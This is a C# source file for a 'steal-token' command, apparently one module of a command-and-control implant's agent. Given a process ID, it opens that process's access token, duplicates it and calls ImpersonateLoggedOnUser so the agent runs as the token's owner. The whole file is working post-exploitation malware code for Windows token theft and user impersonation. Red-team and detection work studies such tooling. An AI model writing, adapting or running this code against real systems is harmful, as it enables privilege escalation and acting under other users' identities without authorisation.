using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;

namespace Agent.Commands
{
    public class StealToken : AgentCommand
    {
        public override string Name => "steal-token";

        public override string Execute(AgentTask task)
        {
            if (!int.TryParse(task.Args[0], out var pid))
                return "Failed to parse PID";

            var hToken = IntPtr.Zero;
            IntPtr DuplicatedToken = new IntPtr();
            var process = Process.GetProcessById(pid);
            try
            {

                var hProcess = process.Handle;
                if (!Native.Advapi.OpenProcessToken(hProcess, Native.Advapi.TOKEN_IMPERSONATE | Native.Advapi.TOKEN_DUPLICATE, out hToken))
                    return $"Failed to open process token -> {Marshal.GetLastWin32Error()}";

                if (!Native.Advapi.DuplicateToken(hToken, 2, ref DuplicatedToken))
                    return $"Failed to duplicate token -> {Marshal.GetLastWin32Error()}";
                
                if (!Native.Advapi.ImpersonateLoggedOnUser(DuplicatedToken))
                    return $"Failed to impersonate via token -> {Marshal.GetLastWin32Error()}";
                var identity = new WindowsIdentity(DuplicatedToken);
                return $"Successfully Impersonated {identity.Name}";
            }
            catch
            {}
            finally
            {
                if (hToken != IntPtr.Zero) Native.Kernel32.CloseHandle(hToken);
                if (DuplicatedToken != IntPtr.Zero) Native.Kernel32.CloseHandle(DuplicatedToken);
                process.Dispose();
            }
            return $"Unknown Error -> {Marshal.GetLastWin32Error()}";
        }
    }
}